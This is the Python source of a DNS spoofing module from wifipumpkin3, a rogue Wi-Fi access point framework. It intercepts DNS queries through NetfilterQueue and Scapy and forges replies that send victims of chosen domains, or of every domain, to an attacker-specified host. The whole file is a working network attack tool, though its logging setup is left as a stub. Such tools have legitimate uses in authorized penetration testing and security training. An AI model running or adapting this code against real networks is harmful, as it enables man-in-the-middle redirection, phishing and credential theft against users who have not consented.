#!/usr/bin/env python
import argparse
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from netfilterqueue import NetfilterQueue

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class DnsSpoofNetFilter(object):
    def __init__(self):
        """ implementation Dnsspoof with Netfilterqueue modules"""
        description = "Module DNS spoofing v0.1"
        usage = "Usage: use --help for futher information"
        parser = argparse.ArgumentParser(description=description, usage=usage)
        parser.add_argument(
            "-d", "--domains", dest="domains", help="Specify the domains", required=True
        )
        parser.add_argument(
            "-r", "--redirect", dest="redirect", help="Redirect host ", required=True
        )
        self.args = parser.parse_args()

    def logggingCreate(self):
        # TODO: implement this function logger with new log implementated with json
        pass
        # setup_logger('dnsspoofAP', './logs/AccessPoint/dnsspoof.log')
        # self.logDNS = logging.getLogger('dnsspoofAP')
        # self.logDNS.info('Dns Spoof: running...')

    def callback(self, packet):
        payload = packet.get_payload()
        pkt = IP(payload)
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if pkt[DNS].qd.qname[: len(str(pkt[DNS].qd.qname)) - 1] in self.domain:
                self.logDNS.info(
                    "{} ->({}) has searched for: {}".format(
                        pkt[IP].src,
                        self.redirect,
                        pkt[DNS].qd.qname[: len(str(pkt[DNS].qd.qname)) - 1],
                    )
                )
                spoofed_pkt = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect),
                    )
                )
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt, verbose=False)
                packet.accept()
            elif len(self.domain) == 1 and self.domain[0] == "":
                self.logDNS.info(
                    "{} ->({}) has searched for: {}".format(
                        pkt[IP].src,
                        self.redirect,
                        pkt[DNS].qd.qname[: len(str(pkt[DNS].qd.qname)) - 1],
                    )
                )
                spoofed_pkt = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    / UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
                    / DNS(
                        id=pkt[DNS].id,
                        qr=1,
                        aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect),
                    )
                )
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt, verbose=False)
                packet.accept()
            else:
                packet.accept()

    def main(self):
        self.redirect, self.domain = self.args.redirect, self.args.domains.split(",")
        self.q = NetfilterQueue()
        self.logggingCreate()
        self.q.bind(0, self.callback)
        self.q.run()


if __name__ == "__main__":
    dnsspoof = DnsSpoofNetFilter()
    dnsspoof.main()
